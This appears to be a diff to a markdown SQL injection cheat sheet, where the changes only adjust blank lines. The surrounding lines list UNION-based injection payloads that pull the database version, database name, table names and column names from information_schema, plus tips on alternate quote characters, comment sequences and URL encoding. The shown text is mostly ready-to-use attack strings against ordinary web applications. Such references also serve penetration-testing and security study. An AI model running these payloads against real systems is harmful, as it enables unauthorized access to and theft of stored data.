@@ -1,4 +1,3 @@
-
 ###### In the following queries, `'` may not work sometimes, so { __\`__,`"` } can  be tested
 ###### To comment out the remaining code, { `;#`,`;--`,`;//` } can be used
 ###### While doing sqli through urls, { `;#`,`;--`,`;//` } need to be encoded specially 
@@ -30,8 +29,10 @@
 ###### Assume no of columns to be 3
 #### Finding version and databases
 *  _[$input_user]_ : `' UNION SELECT 1,@@version,database() --`
+
 #### Extracting Tables from databases
 *  _[$input_user]_ : `' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()`
+
 #### Extracting columns from databases
 *  _[$input_user]_ : `' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()`
 *  _[$input_user]_ : `' UNION SELECT table_name, column_name, 1 FROM information_schema.columns`
